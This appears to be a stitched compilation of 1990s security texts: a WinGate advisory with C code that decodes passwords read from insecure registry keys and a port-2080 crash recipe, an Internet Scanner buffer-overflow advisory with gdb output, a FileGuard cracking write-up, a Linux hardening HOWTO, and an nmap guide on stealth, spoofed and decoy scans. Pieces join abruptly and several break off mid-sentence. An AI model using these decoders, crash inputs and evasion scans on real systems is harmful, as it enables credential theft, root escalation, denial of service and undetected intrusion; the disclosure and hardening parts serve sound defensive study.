       The Winsock Redirector Service sits on port 2080. When you connect to it
       and send 2000 characters and disconnect it will crash all WinGate
       services. O Yippee
       
       ________________________________________________________________________
       
       Decrypt the WinGate passwords
       ________________________________________________________________________
       
       The registry keys where WinGate stores its passwords are insecure and
       let everyone read them. Therefore anyone can get the passwords and
       decrypt them. Code follows.
       
       ________________________________________________________________________
       
       // ChrisA@eEye.com
       // Mike@eEye.com
       
       #include "stdafx.h"
       #include <stdio.h>
       #include <string.h>
       
       main(int argc, char *argv[]) {
       char i;
       
       for(i = 0; i < strlen(argv[1]); i++)
       putchar(argv[1][i]^(char)((i + 1) << 1));
       return 0;
       
       }
       ________________________________________________________________________
       
       You get the idea...
       
       It is good that WinGate 3.0 by default locks down all services to 127.0.0.1.
       However, there still seems to be holes were if one gets access to the
       WinGate service, non-blocked ip, they can do some damage. Chances
       are if you poke hard at some of the other services you will find similar
       problems as above. Software developers need to remember that the avg. user
       is not all
       ways the brightest so our products security must be as tight as possible.
       
       ________________________________________________________________________
       
       Vendor Status
       ________________________________________________________________________
       
       Contacted a month or so ago, have heard nothing. Someone from the NTSEC
       list contact eval-support@wingate.net with our findings and they were
       sent an email back rather quickly. We had sent our emails to
       support@wingate.net and things of the such. Maybe all three of our
       emails just got lost. The last we've heard WinGate is taking steps to fix
       the problem. Look for patches soon.

                             -> Internet Scanner Buffer Overflow <-
                                    (SDI.03-99.iss-scanner)
       
       ---
       complexity      : medium
       critical level  : medium
       ---
       
        1. Introduction 
       
          Internet Scanner (I.S) is a wide known tool to audit the security level
       of a certain network. It has a database which will assist in the detection of  
       the commom security holes that may help an intruder to gain access or
       gather private information from the scanned host.
       
          During the checks, I.S. will run a set of procedures that requires
       privileges in the local host (root), so an ordinary user may not start a
       scan. 
       
          Altough it's not the default configuration, it's commom, in certain
       cases, to set the suid bit to permit "root privileges" so the "audit" user, 
       who does not have the necessary privileges, may execute a scan.
       
          A certain problem was found in the IS program during some tests in
       our lab. While by default it will not represent a thread, in the above
       situation (suid bit owned by root), it will become a security gap.
       
       
        2. I.S Flaw
       
          Internet Scan does not check bounds in some arguments it receives from
       the command line, which will cause a segmentation fault.
        
            sekure:~$ ./iss -D `perl -e "print 'A' x 2000"`
            Creating Directory /usr/local/iss/scans/s.199903241212
            # Time Stamp(2103): Signal - Segmentation Violation: (...)
            (..)
            ISS Scan was interrupted.
            Segmentation fault
       
            sekure:~$ ./iss -c `perl -e "print 'A' x 2000"`
            (...)
            Segmentation fault
       
          Let's check the return address:
       
            (gdb) run -D `perl -e "print 'A' x 2000"`
            Starting program: iss -D `perl -e "print 'A' x 2000"`
            (...)
            Program received signal SIGSEGV, Segmentation fault.
            0x41414141 in ?? ()
            (gdb)
        
          In this situation, we can reach the return address (which holds the
       place the program must return in the memory), so we may execute arbitrary
       commands, and adding the "suid bit" situation, it will be executed with root 
       privileges.
       
       
         3. Who is vulnerable ?
        
         If you are running I.S using the SETUID bit to conceed root privileges
       to an ordinary user, then you ARE vulnerable to this attack.
         
         If you are using the DEFAULT configuration of I.S, you are NOT
       vulnerable.
       
        
         4. Fixing the situation
       
         The ISS which is the owner of I.S does not provide the source code along
       with the program, so we may not provide a quick patch. 
       
         We advice you to remove the suid bit and contact the vendor for a
       correction.
       
         We also advice you to avoid the use of suid bit unless you are familiar
       with the purpose of the program.
         
         
         5. Exploiting the bug
       
         We believe information must be free available. If we don't provide the
       exploit script along with the information, someone else will do. 
       
         We also know that people like to see with their own eyes to believe
       they are vulnerable. So here it is:

       Security Holes In FileGuard 3.0.8
       
       
       
       Table Of Contents:
       
       - Introduction
       - Gaining Full Access
       - Launching The Cracked FileGuard Application
       - Password Protected Volumes
       - Disclaimer
       - End notes
       
       
       --==< Introduction >==--
       
       By far FileGuard is the best protection software for the Macintosh OS.
       To a start it disables the debugger at operations when an attack could
       be expected.  So it's pretty difficult to find out what algorithm it 
       uses to encrypt the passwords.  Not impossible but not as easy as in 
       various other protection software for the Mac.
       
       Lets start with analyzing what FileGuard can do to protect a computer. 
       Well, the appropriate question is more like, what FileGuard CAN'T do?  
       It can protect volumes, it can encrypt files, it can password protect 
       applications, it can limit access to files/ folders, etc...  And it 
       does not have the weaknesses that other security programs have.  Such
       as "emergency passwords" or the letting the user remove extensions with
       use of programs such as FileBuddy.  Shift disable works but is useless 
       if the hard disk is password protected.
       
       
       --==< Gaining Full Access >==--
       
       So this is nice and all, as long as only the administrator can change 
       the various access settings.  But what happens if the attack comes from
       the most unexpected place?  The FileGuard application itself.  This is 
       the application that allows the administrator to change the settings to
       the various protection facilities.  Naturally it's protected.  It only 
       launches if the administrator's password is entered.  However this password
       protection can easily be cracked.  And once it's cracked - meaning that 
       it'll accept any password as the admin password - then anyone can do the 
       changes to the settings that an admin could do.
       
       
       --==< Launching The Cracked FileGuard Application >==--
       
       Launching the cracked application might actually prove to be a problem 
       depending on how limited the user's access to the computer is.  The easiest
       way to launch the cracked FileGuard app is through a user account with the 
       authority to copy and launch applications.  Then the FileGuard application 
       can be copied onto the computer and launched from there.  However, a system
       is still vulnerable if the user is not allowed to copy applications.  If 
       the user has enough access to launch applications from floppy disks then 
       the cracked FileGuard app can simply be copied to a disk and launched  from
       there.
       
       This method can be exploited through the guest account (if the guest account
       is enabled).  The access to the computer using a guest account might be rather
       restricted.  For example, floppy disks might not be allowed to be inserted into
       the computer.  However, users will still be able to insert CDs and if it has a
       copy of the cracked FileGuard app on it then can be launched from there.
       
       
       --==< Password Protected Volumes >==--
       
       I remember how once my computer teacher locked the HD on his computer with 
       FileGuard and something happened to the password.  He spent hours on the net
       before he found out some way of bypassing this problem.  The only way available
       until now was to install a new driver onto the hard drive.  Unfortunately this 
       corrupts the disk.  
       
       Highware has designed a program for situations such as this called EmergencyRemove.
       EmergencyRemove can be used to remove the drive-protection in emergency situations.
       However, even EmergencyRemove requires the appropriate password to be entered in
       order for the protection to be removed.  And this is where the security hole is;
       by cracking EmergencyRemove so that it'll accept any password anyone can remove the
       volume protection from any protected disk.
       
       NOTICE:  I have not actually tried password protecting my hard disk.  So I don't 
       actually "know" whether this method works on hard drives.  I did, however, try this
        method on floppy disks and each attempt was successful.
       
       
       --==< Disclaimer >==--
       
       These security holes are very real and may be exploited for "damaging" purposes.
       The objective of this text file was NOT to encourage such behavior but simply to
       point out the existing security holes of FileGuard 3.0.8.  Therefore, neither mSec
       nor any of it's past, current or future members will take any responsibility for any

       Linux Mini Administration HOWTO.
       By Kostas Petrakis aka Pestilence.
       
       This was written mostly as a small guide to some NT based co-workers here at
       my work so that they could check a few stuff on Linux systems if needed.
       Also i decided to write this because there are lots of administration howto's
       out there which are also kinda old.
       This paper in not a super-detailed paper, for this purpose there are other
       papers mentioned in the end of this HOWTO. This paper was intented to give a
       small clue of what people should check before they decide to allow services to
       run on their systems, or fully connect to the Internet.
       
       More and more people everyday connect their systems to the Internet, and more
       people are seriously thinking of buying either a leased line, or a cable modem
       and stay 24-7 on-line.
       There are allot of systems on-line some of them are tight secured, and
       others are openwide yelling to be hacked.
       This text is intented to give a small idea of what someoone should check at
       his system before he goes on-line, or what to secure once he is on-line.
       
       SERVICES
       
       Many servers over the Internet offer a wide of services to their users and
       customers, what comes here is a big risk since time has prooved that allot
       of services are usually buggy and easily exploitable providing root access, or
       other kinds of access to remote or local users.
       An administrator of either a  home system, or a company, should be
       able to keep on track of this bugs and try to keep his software as more up to
       date as he can. This can be done by subscribing to several security mailing
       lists, such as Bugtraq, or Cert (Links included in the end of this document).
       Another major issue on services are the configurations of each service.
       Services usually follow a "guideline" of operation, which is usually declared
       in the configuration section of each service. Most buggy services have
       prooved to be: sendmail, web servers, ftp servers, and generally all
       services that have to do with interaction between the user and the file
       system. People oftenly like to bypass the configuration of services, and like
       to leave them the way they where installed, without even taking a look at what
       configurations are offering, this is a major mistake oftenly found to Junior
       administrators, or newcomers to the Unix world. 
       
       WEB SERVERS
       
       Web servers keep their configuration files under the directory /etc/httpd/conf
       (default installation from the Linux distribution, which we encourage you to
       update to the most recent), or to /usr/local/apache/conf if recompiled, and you
       leave the paths intact.
       Take a good look at the configuration, sometimes you will see it has entrys
       you wouldn't want to, the one you should surely check is under what user does
       httpd operate, make sure httpd runs under user:nobody and group:nobody. Check
       that the log directory is not user writable, you dont want users "playing" with
       your log files now do you?.
       The biggest security thread though lately with httpd, is it's CGI's.
       CGI's are small programs written either in perl, or C, which are used by the
       webserver, and are usually the most dangerous.
       CGI's if coming from some unknown or not that reliable source should be
       checked for possible problems in their code which would risk the security of
       your webserver. The security risks a CGI could possibly create are the
       following:
       1) Expose Information of your Webserver and its local filesystem/ users.
       2) Search Scripts are the most dangerous, since a small missconfiguration,
       would allow remote users to search your entire filesystem, and reveal high
       risk information to them. Even if you dont run your webserver as root, you
       still have chances to run in big trouble.
       Try not to give access to users (if you allow user webpages, or have
       virtualhosts) to their cgi-bin directories, instead let them mail you and ask
       you to check a cgi script they want to use, or even better give them a list of
       CGI's they can use, that you trust.
       Avoid suid privilleged scripts, they are high risk and there is rarely the
       need for a script to be under such privilleges.
       Try to have scripts that validate the contect submmited by forms, validation
       of data is a more secure way to control what is being passed to your system.
       Avoid scripts that will allow remote systems to use them (Matt's scripts allow
       this feature).
       And finally avoid all scripts that have to do with web interfaces on
       services...this scripts usually are of super high risk!
       More on web security can be found following the links below.
       
       FTP
       
       FTP servers, are another high Risk on systems, generally it would be wise to
       avoid the use of FTP if there is no need, or if there is a need you should
       avoid having anonymous ftp enabled.
       FTP servers are used for file transfers between hosts. More oftenly they are
       used to give users of systems access to their websites.
       If you are from the persons that love, or like to contribute to the Linux
       community either with having a public ftp server offering mirroring services,
       or using the ftp server to release your software you should be very carefull,
       of what you give, and what you allow remote users to have.
       The default ftp daemon that comes with the Linux installation is wu-ftp, this
       server is simple, and good, but unfortunately several bugs where discovered,
       and it seems updates are not that often to it. So i recommend the use of a
       more advanced FTP server, which will allow you to have more detailed
       configuration files. One ftp server i like allot and use oftenly is ProFTPd,
       this server has an apache like configuration file, and allows the admin to
       have full control over it.
       Its widely used on major sites such as Linuxberg, Freshmeat, it updates
       frequently and they have a very good responce time over bugs found on it.
       It's site offers a very good documentation, and the configuration of it is
       really easy even from the average users who want to give partial access to
       remote users.
       It can run as a standalone daemon, or through inetd with the use also of
       tcp-wrappers.
       For instance lets have a look how ProFTPd is configured to allow remote users
       to upload to a directory, but deny them to download from that dir (good to
       deny warez usage of your ftp server) and also deny them the creation of
       subdirectories.
       <Anonymous /home/ftp>
       
                     User ftp
                     Group ftp
                     UserAlias anonymous ftp
       
                     <Directory *>
       
                            <Limit WRITE>
                            DenyAll
                            </Limit>
       
                     </Directory>
       
                     <Directory incoming>
       
                            <Limit STOR>
                            AllowAll
                            </Limit>
                            <Limit READ>
                            DenyAll
                            </Limit>
       
                     </Directory>
       
               </Anonymous>
       This is what the entry looks like in proftpd.conf, this denies the remote
       anonymous users to write to any directory except of incoming, in that
       directory anonymous users are allowed to upload files, but they are denyed of
       reading the directory, deletetion of files, or the creation of
       subdirectories. If you are more paranoid and even if you have limited the usage
       of ftp only to valid users but you need more security, you can make use of a
       nice firewall, this though requires that most of your ftp users are local
       users, and remote users that are allowed usage of the ftp server have static
       IP's. To do so, you would setup a firewall allowing access from your subnet,
       and the remote users and would DENY everyone else trying to connect to it.
       
       SHADOW PASSWORDS
       
       One of the most important things is the password management. Passwords are
       held in the /etc/passwd file (in case you didn't know...). Leaving password
       files like that is a high security risk, and even if you don't allow access to
       the system to any user, should be more secure.
       Password files can be more secure with the usage of shadow, since password
       files are user readable you should switch to shadow (i don't understand why
       some distributions of Linux don't install by default shadowing), anyway as we
       said /etc/passwd is world readable, this means that any user with access to
       your system is able to read the password file. The encryption of password
       files is really weak, and a simple user with a password cracker would be able
       to crack a few passwords in a few minutes. Its highly advisable to all users either with local
       boxes or company administrators to switch to shadowing.
       To use shadowing on your system you only have to run the pwconv command
       usually residing in the /usr/sbin directory. This will create a seperate file
       in the /etc dir called shadow, which holds the encrypted passwords, and will
       replace the password field in the /etc/passwd file with a "x" e.g
       
       pestilence:x:500:500::/home/pestilence:/bin/bash
       
       This is the entry in passwd after the usage of shadow.
       The original password is kept in /etc/shadow which is readble only by root,
       thus denying now the local users to "take a look" at your passwords.
       For more security, if you use a radius server with the companion of a cisco
       router for authentication, it would be wise to deny access to users at your
       system, to do this simply change the shell entrys in the passwd file to some
       non-existened shell.
       
       POP
       
       POP is used to allow users to retrieve their e-mail remotely. There aren't much
       of pop daemons, but its preffered not to use the default that comes with the
       installation (ipop3d), i would advise you to use one such as qpopper, which
       runs through inetd and can be used with TCP Wrappers.
       POP is a service that usually is wide open, this means that users that have
       accounts on your system, but use also on some other ISP can connect to your
       system and retrieve their mail.
       Usually it's left like that, but if you are really paranoid you can block all
       remote systems and allow only local users to connect and retrieve their mail.
       Just 1 thing must be sure, don't install a pop daemon that doesn't get the
       needed support by it's authors, or doesn't produce some kind of detailed logs
       (such as failed password entry attempts, or connections).
       
       SENDMAIL
       
       Here things get a bit more complicated, sendmail is the daemon used to send
       and receive e-mails between hosts.
       Sendmail uses several configuration files, with its main config file being
       sendmail.cf.
       Through this file you declare the files to be used for various purposes, such
       as the list with the allowed domains to use sendmail (ip-allow, name-allow),
       and the relay list, which contains the domains of virtualhosts you host.
       Lets take a closer look to sendmail.
       Unfortunately sendmail is propably one of the most buggy services on the
       Internet, up to now nearly all versions of it have either a remote, or local
       exploitation.
       Because of this problems you should be really carefull with sendmail, a small
       missconfiguration might cause you a big headache later.
       The main files you should be carefull with are:
       ip-allow --> here you enter all the IP's you want to allow to use your
       sendmail...don't leave it blank, otherwise you will have the whole Internet
       using your sendmail to mail.
       name-allow --> same as above but here you enter the hostnames of the systems
       (usually used when VirtualHosting is being done on your systems).
       relay --> This file contains the host to wich we allow relaying...this also
       shouldn't be left empty.
       sendmail.cw --> this file holds all the aliases for your system, this is again
       used if you host several virtual domains.
       Don't forget to oftenly upgrade your sendmail...yes i know this is kinda like
       a small pain in the ass, but it's also your only way to prevent the damage
       that a newly discovered bug can produce.
       
       DNS
       
       DNS is the service used to resolve the ip address of a host to a valid
       hostname.
       All big networks with their own domain use DNS, DNS has been subject to heavy
       remote exploitations in the past, and also is a service than can be used to
       give away allot of usefull info to intruders (such as your network systems,
       intruders combining the BIND version can sometimes guess the remote O/S and
       it's version). It's high advisable to move to BIND 4.9.7 or the 8.X series, if
       you are still running a 4.9.6 series of it, then you are vulnerable to a
       remote root exploitation.
       Make sure you have configured DNS properly, otherwise you might experience
       problems. Also the use of a firewall (for the interactivy between the primary
       and the secondary nameserver) would be highly recommended.
       
       LOGGING
       
       One of the most important aspects of system administration, is extensive
       logging, and also constant monitoring of the systems.
       Linux logs use various loggers, all of the logs are kept under /var/log.
       Let's take a better look at the loggers of Linux:
       messages --> here the system ouputs various kernel, and service messages with
       the use of sysklogd
       secure --> here the system logs connection attempts to various ports from
       local, or remote hosts.
       mailog --> The sendmail daemon logs nearly everything here.
       xferlog --> the ftp daemon outputs its messages here.
       wtmp --> When a user logs, or the system reboots this file changes, it's a
       binary file and you can't "cat" it or "tail" it, to get access to it you use
       the "last" command. This command outputs formated the data kept in wtmp.
       System logs allthough are kept under root privilleges doesn't mean once hacked
       they cant be modified, there are various tools in the trade which allow users
       to erase specific strings from them and thus hide their appearance on your
       systems. A way to make it more difficult to erase their presence from the logs
       (allthough this doesn't mean they cant still erase), is to use remote logs, 
       sysklogd has a feature, which allows system admins to log also on remote
       systems. I would reccomend this method, since it allows you to have a seperate
       log file on a remote system, and since the hacking scene has allot of newbies
       they nearly never check for remote logs.
       Allthough the logging facility of Unix systems is good, its not designed to
       heavy log. To have a better chances of detecting suspicious moves, i recommend
       log daemons for this specific task...detect and log, such loggers are iplog
       (which i widely use on my systems). Iplog is a set of 3 log daemons:
       tcplog --> logs and detects all tcp connections, it's also able to detect and
       log, scans using nmap.
       udplog --> logs all udp traffic
       icmplog --> logs all icmp traffic
       Always try to enable seperate logs for all your daemons (e.g qpopper -->
       /var/log/pop), this makes the monitoring process more easy.
       Get logcheck,this program will scan your regular logs for security
       violations, Unusuall system events, etc.
       Try to monitor regulary your systems logs...don't let them pass by, before the
       storm there are always some drops of rain...so you might be lucky and stop the
       intruders before they gain access. Make some shell script for your logs, and
       make them scan your logs for specified strings, enable their usage with the
       cron daemon, and make them check the logs in small period of time, so you can
       have a nice organized report in small time periods, without confusing your
       head in the (usually) huge system logs.
       
       XWINDOWS
       
       Xwindows is another security headache.
       Unfortunately Xwindows are allot of risk, so i would advise if you use a
       system as a server, not to use Xwindows, as you risk your security with their
       usage.
       If though you need to make use of them, make sure to setup some security, use
       some firewall, and don't forget of the "xhost -" command which will disable
       remote access to your X facility.
       
       TELNET
       
       If there isn't a real necesity of it, disable it. Allthough telnet by itself
       isn't that much of a security risk, it can be usefull to future intruders to
       work their way in e easily. If you need telnet, try to setup a firewall to
       restrict access to it.
       A simple move also to the total newbies would be to change you /etc/issue.net
       file, issue.net usually contains the type of O/S you run, and it's used as a
       banner to telnet connections. Allthough there are toold in the trade to detect
       what a remote systems O/S is (nmap, quesso), there are also plenty of windows
       hacker wannabes which usually will just telnet to check what O/S your
       running...deny (even if it's really easy to determine the remote O/S) them
       knowledge on your system.
       
       KERNEL OPTIONS
       
       On the 2.2.x series of kernels there are a few interesting options using
       booleans under your /proc/sys/net/ipv4 folder, this are icmp_echo_ignore_all,
       icmp_echo_ignore_broadcasts .etc, this files are used to specify some
       networking "reactions" of your system...it is advised (not necessary though)
       to:
       echo 1 > 
       those files, this will prevent ping replys to ping requests, and also will
       help you avoid smurf attacks over your network.
       tcp_syncookies is also advised to be echoed to 1, if your system is a widely
       used server.
       While compiling the 2.2.x kernel don't forget to include as many networking
       options as you can, such as routing messages, firewall support, etc.
       This will help you setup a more effectively working network.
       
       SNIFFERS
       
       Allthough sniffers aren't necessary to run all the time, it's wise to use them
       time to time.
       Network sniffers catch and display the datagrams moving around your network,
       it's usually a helpfull way to detect problems in your network.
       Latest kernels have also the abillity to detect if some device has entered
       promiscous mode (sniffer activated on some device). Make sure simple users dont
       have access to the sniffer, otherwise you will have big time troubles (since
       usually most services use plain text passwords).
       There is a big collection of good sniffers, so i wont discuss any of them...i
       usually fire up X and run Ethereal if there is a big need to do so.
       
       AUDITING TOOLS
       
       This tools are widely used by hackers to scan networks for known problems...so
       if hackers use them, you should also use them.
       Nessus is at the moment the best tool for such a task, its nearly
       updated everyday and currently it supports 209 security checks.
       Always run a scan on your network, check if you missed something, don't allow
       intruders gain advantage of something you forgot.
       This tools should be used very often on ALL your systems.
       
       TEMPORARY SYSTEMS
       
       Allot of times before i install a server, i temporary connect it to the
       network so i can ftp and fetch all the needed files.
       Since this systems are getting ready to either replace an existing server, or
       be a part of the network as new a server, you should be very carefull.
       Intruders dont always scan a single system, they might scan a whole subnet to
       get information on every system you have running on your network. So even if
       that system is a temporary one, don't bypass it's configuration, configure it
       to be as secure as it can be, and try to deny every kind of connection to it
       (use a firewall or something).
       
       ## /etc/inetd.conf ##
       
       Through this file some of the systems services are handled. The default file
       has many useless and unwanted services open. You should modify this file
       immediately after you install your system.
       Close nearly all ports, and leave open only those you need, echo, time, date
       and such ports are rarely used, and are not needed by any programs, so make
       sure you disable them.
       Services in inetd.conf have the abillity to work with tcp_wrappers. We are
       going to explain tcp_wrappers in the next section.
       
       TCP WRAPPERS
       
       Tcp Wrappers are files that are used to restrict access to your system(
       allthough i prefer using a firewall for this kind of work). If you are new to
       the firewall world, and need really quickly to restrict access to some
       services use them, but then go and read the firewall HOWTO :).
       The best way would be to use both a firewall and tcp wrappers.
       Tcp wrappers use the files: /etc/hosts.allow and /etc/hosts.deny, hosts.allow
       holds all the ip addresses of the systems or subnets you want to allow access
       to services, and hosts.deny include hosts that are denyed to access services.
       WARNING: Not all services use tcp wrappers, for instance sendmail is now a
       stand alone daemon, so tcp wrappers wont work with it, make sure you see if a
       service supports tcp wrappers before feeling "kinda" secure.
       
       FIREWALLS
       
       Firewalls are something that every administrator loves to have on his network,
       firewalling can have many different faces.
       1) Connect a Internal Network through a single system (also called
       masquerading, but it also can act as a firewall, denying the remote users to
       log into the internal Network).
       2) A system which through a program such as ipfwadm (for the 2.0.x kernels)
       and ipchains (for the 2.2.x kernels) can block and filter connections to user
       specified ports.
       A firewall acts as a wall between your system and the Internet, you configure
       it the way you like it, and it acts that way.
       For instance on my system (kernel 2.2.4) when i want to block users connecting
       to my telnet port, i would issue the following command:
       ipchains -A input -p tcp -s 0/0 -d 194.xxx.xx.xx telnet -j DENY -l
       Let's take a better look at this commmand:
       -A input --> ipchains after installation come with 3 preinstalled chains
       (input/output/forward, meaning the input data, output data, and finally
       forwarding data), with the -A flag we tell ipchains to Append our "rule" to
       the chain.
       -p tcp --> here we specify the protocol, i think the protocol i
       mention is obvious...other protocols include udp, and icmp
       -s 0/0 --> -s stands for source IP/host/subnet, you can either specify a whole
       subnet or a single IP, 0/0 stands for everyone...so we tell ipchains to match
       any ip address to this rule
       -d 194.xxx.xx.xx --> -d stands for destination IP/host/Network, here we
       specified a single IP (xxx used for privacy reasons, change them to your IP
       address)this ip is the IP of the destination host, meaning the host that
       receives all the data, usually you would specify your system, unless you have
       a router-box
       telnet --> after the destination host you specify the port, or
       service, ipchains can understand services which already exist in the
       /etc/service file, otherwise you need to specify a port / range of ports. For
       instance if we wanted to block ports from 6000 up to 6010 we would type:
       6000:6010 
       -j DENY --> here we declare to ipchains what to do with
       datagrams that match this rules, simply here we DENY them, other methods
       include ACCEPT and REJECT
       -l --> -l stands for logging, enabling this options ipchains will output
       through the kernel into /var/log/messages every packet that matches this
       rules...be aware that this produces usually some heavy logs.
       Remember that when you create a rule think wisely, this service may be
       needed, or some other hosts must have access to it, by blocking a needed
       service you might create some problems.
       Always remember that when you want to block a service, but you want to give
       access to certain systems/networks, you have to declare first the ACCEPT
       rules, and then the DENY, otherwise all hosts will be denyed, since ipchains
       compares the datagrams with the chains in a descenting order.
       For example say we own pestilence.foo.com and we want to grant access to the
       ftp service to cool.foo.com, but DENY everyone else. We would type the
       following:
       ipchains -A input -p tcp -s cool.foo.com -d pestilence.foo.com ftp -j ACCEPT
       ipchains -A input -p tcp -s 0/0 -d pestilence.foo.com ftp -j DENY -l
       
       Now cool.foo.com has access to out ftp, but the rest of the Internet doesn't.
       For more information on firewalling take a look at the HOWTO.

  35.0 Guide to using NMAP by Lamont Granquist .
       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
       
       From Packetstorm http://www.genocide2600.com/~tattooman/new.shtml 
       <a href="http://www.genocide2600.com/~tattooman/new.shtml">Link</a>
       
       Date: Mon, 5 Apr 1999 16:50:23 -0700
       From: Lamont Granquist <lamontg@raven.genome.washington.edu>
       To: nmap-hackers@insecure.org
       Subject: NMAP guide
       
       
       NMAP has been getting a lot of review on what its capabilities are lately,
       so I thought I'd take a shot at it as well.  I skipped over a few things
       that I didn't think were really worth mentioning (you better be able to
       figure out -p and -F).
       
       Comments more than welcome.
       
       -------------------------------------------------------------
       
       NMAP does three things.  First, it will ping a number of hosts to
       determine if they are alive or not.  Second, it will portscan hosts to
       determine what services are listening.  Third, it will attempt to
       determine the OS of hosts.
       
       Of course NMAP is very configurable, and any of these steps may be
       omitted, (although portscanning is necessary in order to do an OS scan),
       and there are multiple ways to accomplish most of these, and many command
       line switches to tweak the way that NMAP operates.
       
       Target Selection
       
       You can specify NMAP targets both on the command line or give a list of
       targets in a filename with the -i option.  As the NMAP help documentation
       suggests you can use the hostname/mask method of specifying a range of
       hosts (cert.org/24 or 192.88.209.5/24) or you can give a explicit IP range
       (192.88.209.0-255).  The '24' in 'cert.org/24' is the number of bits in
       the mask, so /32 means "just that host", /24 means "the 256 addresses in
       that Class C", /16 means "the 65536 addresses in that Class B", /8 would
       be "the 2^24 addresses in that Class A" and /0 would scan all possible
       (IPv4) 2^32 IP addresses.
       
       Ping Scans
       
       The default behavior of NMAP is to do both an ICMP ping sweep (the usual
       kind of ping) and a TCP port 80 ACK ping sweep.  If an admin is logging
       these this will be fairly characteristic of NMAP.  This behavior can be
       changed in several ways.  The easiest way is, of course, to simply turn
       off ping sweeps with -P0.
       
       If you want to do a standard ICMP ping sweep use -PI.  If you are trying
       to get through a firewall, though, ICMP pings will likely be blocked and
       using packet filtering ICMP pings can even be dropped at the host.  To get
       around this NMAP tries to do a TCP "ping" to see if a host is up.  By
       default it sends an ACK to port 80 and expects to see a RST from that port
       if the host is up.  To do only this scan and not the ICMP ping scan use
       -PT.  To specify a different port than port 80 to scan for specify it
       immediately afterwards, e.g. -PT32523 will ACK ping port 32523.  Picking a
       random high-numbered port in this way may work *much* better than the
       default NMAP behavior of ACK pinging port 80.  This is because many packet
       filter rules are setup to let through all packets to high numbered ports
       with the ACK bit set, but sites may filter port 80 on every machine other
       than their publically accessable webservers.  You can also do both an ICMP
       ping scan and an ACK scan to a high numbered port with, e.g. -PB32523.  
       However, if a site has a really, really intelligent firewall that
       recognizes that your ACK packet isn't part of an ongoing TCP connection it
       might be smart enough to block it.  For that reason, you may get better
       results with a TCP SYN sweep with -PS.  In this case, scanning a
       high-numbered port will probably not work, and instead you need to pick a
       port which is likely to get through a firewall. Port 80 is not a bad pick,
       but something like ssh (port 22) may be better.
       
       So the first question to ask yourself is if you care about wasting time
       scanning machines which are not up and if you care about getting really
       complete coverage of the network?  If you don't care about wasting time
       and really want to hit all the machines on a network, then use -P0.  
       Pinging machines will only cause you to have more of a signature in any
       log files and will eliminate machines which might possibly be up.  Of
       course, you will waste time scanning all the IP numbers which aren't
       assigned.
       
       If you do ping machines, an ICMP ping sweep is probably more likely to be
       missed or ignored by system administrators.  It doesn't look all that
       hostile. If you think you're up against a firewall you should experiment
       with which kinds of pings seem to get through it.  Do ICMP pings work at
       all?  Can you ping thier webserver?  If not, then don't bother with ICMP
       pings.  Can you ACK ping thier webserver?  If not, then you have to go
       with SYN pings.
       
       What if all you want to do is a ping scan?  Then use -sP.
       
       Port Scanning
       
       The vanilla scan is a TCP connect() scan (-sT).  These are loggable.  You
       probably don't want to do these.
       
       SYN scans (-sS) are the workhorse of scanning methods.  They are also
       called "half-open" scans because you simply send a SYN packet, look for
       the return SYN|ACK (open) or RST (closed) packet and then you tear down
       the connction before sending the ACK that would normally finish the TCP
       3-way handshake. These scans don't depend on the characteristics of the
       target TCP stack and will work anytime a connect() scan would have worked.  
       They are also harder to detect -- TCP-wrappers or anything outside of the
       kernel shouldn't be able to pick up these scans -- packet filters like
       ipfwadm or a firewall can though.  If a box is being filtered NMAP's SYN
       scan will detect this and report ports which are being filtered.
       
       FIN (-sF), NULL (-sN) and XMAS (-sX) scans are all similar.  They all rely
       on RFC-compliance and as such don't work against boxes like Win95/98/NT or
       IRIX.  They also work by getting either a RST back (closed port) or a
       dropped packet (open port).  Of course, the other situation where you
       might get back a dropped packet is if you've got a packet filter blocking
       access to that port.  In that case you will get back a ton of false open
       ports. A few years back these kinds of scans might have been stealthy and
       undetectable.  These days they probably aren't.
       
       You can combine any of the SYN, FIN, NULL or XMAS scans with the (-f) flag
       to get a small fragment scan.  This splits the packet which is sent into
       two tiny frags which can sometimes get through firewalls and avoid
       detection.  Unfortunately, if you're not running a recent version of an
       open source O/S (Linux or Net/Open/FreeBSD) then you probably can't frag
       scan due to the implimenation of SOCK_RAW on most unixes (Solaris, SunOS,
       IRIX, etc).  See Fyodor's NMAP portability chart to see if -f is supported
       on your platform.
       
       For the initiated out there, you could modify libpcap to allow you to send
       packets in addition to sniffing them by opening the packet capture device
       rw instead of ro.  Then you need to build a link-layer (probably ethernet)
       header and then you could impliment your own frag scanner.  For bonus
       points impliment all of the different SYN, FIN, NULL and XMAS scans *and*
       allow for sending the fragments out in reverse order (which helps for
       getting through firewalls).  This hasn't been done (yet) in NMAP due to
       the fact that NMAP needs to support multiple different link layer
       interfaces (not just ethernet) and needs code for dealing with ARP.  If
       anyone wants to code this up, I'm sure that people would appreciate it.
       
       UDP scanning (-sU) in NMAP has the same problem as FIN scans in that
       packet filtered ports will turn up as being open ports.  It also runs
       extremely slowly against machines with UDP packet filters.
       
       Another type of scan is the bounce scan (-b <ftp_relay_host>) which, if
       there is insufficient logging on the ftp host you're using to bounce, is
       completely untraceable.  Recent FTP servers shouldn't let you do these
       kinds of scans.
       
       The last scanning option that I'm going to mention is identd scanning (-I)
       which only works with TCP connect scans (-sT).  This will let you know the
       owner of the daemon which is listening on the port.  Provided, of course,
       that the site is running identd and is not doing something intelligent
       like using a cryptographic hash (i.e. pidentd -C).  You *have* to make
       complete 3-way TCP handshakes for this to work, so this is not very
       stealthy.  It does, however, give you a lot of information.  It only works
       against machines that have port 113/auth open.
       
       Source IP Deception
       
       You can also take advantage of the fact that you can change your source
       address.  The simplest way to do this is with -S <ip>.  If you are on a
       broadcast ethernet segment you could change your source address to an IP
       which doesn't exist and then you simply sniff the network for the reply
       packets.  And if you are not on a leaf node/network then as long as the
       reply packet will get routed by you, you can use it.  To turn this on its
       head:  the next time you get scanned, do a traceroute on the machine that
       scanned you.  Any of the machines on any of the networks that those
       packets went through could have been the machine which was *really*
       scanning you.
       
       The other deceptive measure is to use decoy scans.  You spoof a ton of
       scans originating from decoy machines and insert your IP in the middle of
       it somewhere.  The admin at the site you are scanning is presented with X
       number of scans and no way to determine which one actually did it.  For
       bonus points, combine this with the previous tactic and spoof an IP
       address which doesn't exist.  If you don't spoof your own IP address make
       sure to use "likely" decoys -- use machines which were connected to the
       net at the time you made your scans and don't use sites like
       www.microsoft.com.  Ideally you want a lot of linux boxes as decoys.  The
       more decoys the better, but obviously the slower the scan will go.
       
       [ QUESTION: do decoy/spoof scans also decoy/spoof the ping scan?  can you
